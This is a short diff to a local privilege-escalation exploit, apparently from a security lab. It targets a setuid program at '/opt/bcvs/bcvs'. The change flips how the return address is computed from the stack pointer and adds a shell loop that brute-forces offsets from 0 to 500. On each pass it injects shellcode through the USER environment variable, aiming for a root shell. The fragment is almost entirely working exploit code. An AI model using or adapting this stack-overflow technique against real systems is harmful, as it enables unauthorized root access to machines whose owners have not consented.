@@ -42,7 +42,7 @@ void main(int argc, char* argv[]) {
 
   if (argc > 1) offset = atoi(argv[1]);
 
-  addr = get_sp() - offset;
+  addr = get_sp() + offset;
 
 
   ptr = buff;
@@ -80,8 +80,8 @@ gcc -o exploit exploit.c
 
 SHELL_CODE=$($EXPLOIT_EXE)
 
-OFFSET=100
-
+#OFFSET=100
+OFFSET=0
 SHELL_CODE=$($EXPLOIT_EXE $OFFSET)
 
 export USER=${SHELL_CODE}
@@ -92,6 +92,12 @@ echo ${PATH}
 echo "junk" > "dummy_input"
 echo "hey" > "haxor"
 /opt/bcvs/bcvs ci haxor < dummy_input
-/opt/bcvs/bcvs co blah < dummy_input
 
+while [ "$OFFSET" -le 500 ]
+do
+SHELL_CODE=$($EXPLOIT_EXE $OFFSET)
+export USER=${SHELL_CODE}
+/opt/bcvs/bcvs co blah < dummy_input
+((OFFSET++))
+done
 # And then hopefully you have a root shell at this point
